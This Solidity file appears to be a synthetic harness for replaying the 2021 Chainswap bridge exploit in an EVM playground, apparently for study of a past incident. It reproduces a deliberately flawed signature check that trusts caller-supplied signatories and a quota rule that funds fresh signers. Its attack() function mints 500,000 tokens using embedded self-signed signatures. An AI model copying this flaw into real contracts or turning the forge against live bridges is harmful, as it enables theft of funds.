// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Execution harness (synthetic) ONLY for the EVM Playground recorder
// (2021-07-Chainswap_exp2).
//
// The real vulnerable logic lives in the verified Factory.sol (MappingBase
// inside the 0x302E5E... impl). This file is a minimal self-contained
// reconstruction used solely so the in-browser EVM can execute a successful
// mint sequence (the registry PoC replay + anvil dump are degenerate and
// cannot run the real proxy path to completion).
//
// The mjs now anchors vulnerability + story on the *real* vuln contract
// address (0x302e5e...) + lines from the fetched verified source. This file
// is never shown as the "vuln contract" in the playground UI.

struct Signature {
    address signatory;
    uint8 v;
    bytes32 r;
    bytes32 s;
}

contract ChainswapForge {
    // ---- participants / constants ----
    address constant ATTACKER = 0xEda5066780dE29D00dfb54581A707ef6F52D8113;

    // EIP-712 typehashes — verbatim from MappingBase (Factory.sol:2345 / :2356)
    bytes32 constant RECEIVE_TYPEHASH =
        keccak256("Receive(uint256 fromChainId,address to,uint256 nonce,uint256 volume,address signatory)");
    bytes32 constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

    // ---- bridge config (mirrors Factory config at deployment) ----
    uint256 constant MIN_SIGNATURES = 3;       // config[_minSignatures_]
    uint256 constant AUTO_QUOTA_RATIO = 0.01 ether; // 1% of cap
    uint256 constant AUTO_QUOTA_PERIOD = 1 days;
    uint256 constant CAP = 50_000_000 ether;   // synthetic mapped-token supply cap

    // ---- the attack parameters ----
    uint256 constant FROM_CHAIN_ID = 1;
    uint256 constant VOLUME = 500_000 ether;   // 500,000 units minted per receive()

    // ---- reconstructed MappingBase / ERC20 storage ----
    bytes32 internal _DOMAIN_SEPARATOR;
    mapping(uint256 => mapping(address => mapping(uint256 => uint256))) public received;
    mapping(address => uint256) internal _authQuotas;
    mapping(address => uint256) public lasttimeUpdateQuotaOf;
    uint256 public autoQuotaRatio = AUTO_QUOTA_RATIO;
    uint256 public autoQuotaPeriod = AUTO_QUOTA_PERIOD;

    // ---- minimal ERC20 (the synthetic mapped token) ----
    string public name = "MappingToken";
    string public symbol = "MCS";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor() {
        // verbatim from MappingToken.__MappingToken_init_unchained:
        // _DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), _chainId(), address(this)))
        _DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), block.chainid, address(this)));
    }

    // ------------------------------------------------------------------
    // The vulnerable receive() — copied verbatim from Factory.sol:2448-2467
    // (signature check is self-referential: signatory comes from caller input).
    // ------------------------------------------------------------------
    function release(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures)
        public
        payable
    {
        // _chargeFee() elided (no economic relevance to the mint bypass); msg.value ignored.
        require(received[fromChainId][to][nonce] == 0, "withdrawn already");
        uint256 N = signatures.length;
        require(N >= MIN_SIGNATURES, "too few signatures");
        for (uint256 i = 0; i < N; i++) {
            for (uint256 j = 0; j < i; j++)
                require(signatures[i].signatory != signatures[j].signatory, "repetitive signatory");
            bytes32 structHash =
                keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));
            bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _DOMAIN_SEPARATOR, structHash));
            address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);
            require(signatory != address(0), "invalid signature");
            require(signatory == signatures[i].signatory, "unauthorized"); // ⚠️ self-consistent only
            _decreaseAuthQuota(signatures[i].signatory, volume);
        }
        received[fromChainId][to][nonce] = volume;
        _receive(to, volume); // mint
    }

    // _decreaseAuthQuota + authQuotaOf — verbatim from Factory.sol:2373-2427.
    // The `updateAutoQuota` modifier FIRST synchronizes the stored quota to the
    // current effective quota (auto-saturating a fresh signatory to `1% of cap`)
    // before the function body runs, so the subtraction never underflows.
    function _decreaseAuthQuota(address signatory, uint256 decrement) internal {
        // updateAutoQuota(signatory) modifier body:
        uint256 quota = authQuotaOf(signatory);
        if (_authQuotas[signatory] != quota) {
            _authQuotas[signatory] = quota;
            lasttimeUpdateQuotaOf[signatory] = block.timestamp;
        }
        if (quota < decrement) decrement = quota; // saturate (SafeMath guard)
        _authQuotas[signatory] -= decrement;
    }

    function authQuotaOf(address signatory) public view returns (uint256 quota) {
        quota = _authQuotas[signatory];
        uint256 ratio = autoQuotaRatio;
        uint256 period = autoQuotaPeriod;
        if (ratio == 0 || period == 0 || period == type(uint256).max) return quota;
        uint256 quotaCap = (CAP * ratio) / 1e18; // 1% of supply cap
        // ⚠️ for a fresh signatory, lasttimeUpdateQuotaOf == 0, so (now - 0) is huge
        uint256 delta = (quotaCap * (block.timestamp - lasttimeUpdateQuotaOf[signatory])) / period;
        if (quota + delta < quota) return quotaCap; // overflow guard
        uint256 cand = quota + delta;
        return cand < quotaCap ? cand : quotaCap; // Math.min(quotaCap, quota+delta)
    }

    function _receive(address to, uint256 volume) internal {
        _mint(to, volume);
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    // ------------------------------------------------------------------
    // The attack. Pre-computed self-signed validator tuples are embedded; each
    // trivially satisfies ecrecover(digest) == signatures[i].signatory because the
    // attacker controls both the key and the claimed signatory field.
    // ------------------------------------------------------------------
    function attack() external {
        Signature[] memory sigs = new Signature[](MIN_SIGNATURES);
        sigs[0] = Signature({
            signatory: 0x3d104ad3c6BDdDd0456d420d903e49280cBFc143,
            v: 27,
            r: 0x61d57946a0b245174829d178e91a2e7716b56ebaec072748f14f760efc2fdc11,
            s: 0x48dc735ed5c0f4043d8847ce0cd0643ed0bd8d72a0cc9a6a75d0587039adaf10
        });
        sigs[1] = Signature({
            signatory: 0xd4753944F7eddebB33b333CcE6D720e42bFF67b9,
            v: 28,
            r: 0x48787a7805d9039aaaf33d2ba304d9d58dcf8eb8d086841314e43af3adbaccc6,
            s: 0x368f714a5c0137af49a13a787f5be56847af6bb4d4f84739a05a3553973ef2b9
        });
        sigs[2] = Signature({
            signatory: 0xD27C48f1C1daf23cD3663E419F69912cDA73ee15,
            v: 27,
            r: 0xe0d36d13895c787c836c5f7ae11bcccc0226c35bab343fa3f118c420023f41de,
            s: 0x3be98bdf8cc26b345f8b6c730ca498cd0c71de4060e1011179c7df14e7e16e58
        });
        release(FROM_CHAIN_ID, ATTACKER, 0, VOLUME, sigs);
    }
}
